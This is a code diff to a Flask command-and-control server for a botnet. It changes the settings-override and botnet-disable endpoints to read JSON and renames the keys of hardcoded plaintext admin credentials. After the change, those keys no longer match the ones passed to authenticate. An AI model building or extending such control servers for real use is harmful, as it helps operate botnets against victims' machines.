@@ -22,8 +22,8 @@ logPath      = './data/ccserver.log'
 # parameters for CC instance
 settingsPath = './data/settings.json'
 credentialsD = {
-    'auth_usr' : "fsociety",
-    'auth_pwd' : "steelmountain"
+    'admin_usr' : "fsociety",
+    'admin_pwd' : "steelmountain"
 }
 # creating CC instance
 CC = CCServer(settingsPath, credentialsD)
@@ -46,20 +46,20 @@ def getSettings():
 @app.route('/update', methods=['POST'])
 def updateSettings():
     # retrieving username and password 
-    if CC.authenticate({ 'auth_usr'  : request.form['user'], 'admin_pwd' : request.form['password'] }): 
+    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
         # if user is correctly authenticated we can performe update op.
         try:
-            CC.updateSettings(request.form['settings'])
-            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            CC.updateSettings(request.json['settings'])
+            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
             return "Override succeded", 200
         except KeyError as error:
             # if settings is missing as a param... update cannot be carried on
-            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
             return "Bad request, override failure", 400
 
     else:
         # if user was not authenticated properly, we log the event and return a forbidden status
-        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
         return "Forbidden!", 403
 
 
@@ -81,20 +81,19 @@ def getLog():
 @app.route('/disable', methods=['POST'])
 def disableBotnet():
     # retrieving username and password 
-    if CC.authenticate({ 'auth_usr'  : request.form['user'], 'admin_pwd' : request.form['password'] }): 
+    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
         # if user is correctly authenticated we can performe update op.
         try:
             CC.updateSettings({}, enable=False)
-            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
             return "Botnet disabled!", 200
         except KeyError as error:
             # if settings is missing as a param... update cannot be carried on
-            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
-            return "Bad request, botnet disable", 400
-
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+            return "Bad request, botnet disable failure", 400
     else:
         # if user was not authenticated properly, we log the event and return a forbidden status
-        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
         return "Forbidden!", 403
 
 
